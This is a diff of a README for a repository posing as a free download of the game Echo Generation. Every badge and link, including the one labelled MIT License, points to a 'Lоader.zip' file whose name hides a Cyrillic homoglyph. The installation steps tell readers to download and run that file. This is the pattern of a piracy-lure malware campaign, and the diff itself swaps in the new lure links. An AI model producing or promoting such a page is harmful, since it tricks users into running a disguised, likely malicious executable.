@@ -1,5 +1,5 @@
 # 🎮 Echo Generation: Unlimited Download  
-[![Download](https://img.shields.io/badge/Download-Echo%20Generation-green.svg)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip%https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip)](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip)
 
 ## 🚀 Overview
 
@@ -30,7 +30,7 @@ Echo Generation download, 2025 full game, Story adventure, Turn-based indie comb
 
 ## 🛠️ Installation
 
-1. Click [![Download](https://img.shields.io/badge/Download-Echo%20Generation-green.svg)](https://easylauncher.su/PSnzrH) to get the installer.  
+1. Click [![Download](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip%https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip)](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip) to get the installer.  
 2. Run the downloaded file and follow on-screen prompts.  
 3. Launch Echo Generation and enjoy the journey on your chosen platform.  
 
@@ -40,9 +40,9 @@ This repository is maintained for educational and informational purposes only. R
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) (2025).
+Distributed under the [MIT License](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip) (2025).
 
 ---
 
 ## 📥 Download  
-[![Download](https://img.shields.io/badge/Download-Echo%20Generation-green.svg)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip%https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip)](https://raw.githubusercontent.com/Gnro-19/EchoGenerationHub/main/Lоader.zip)
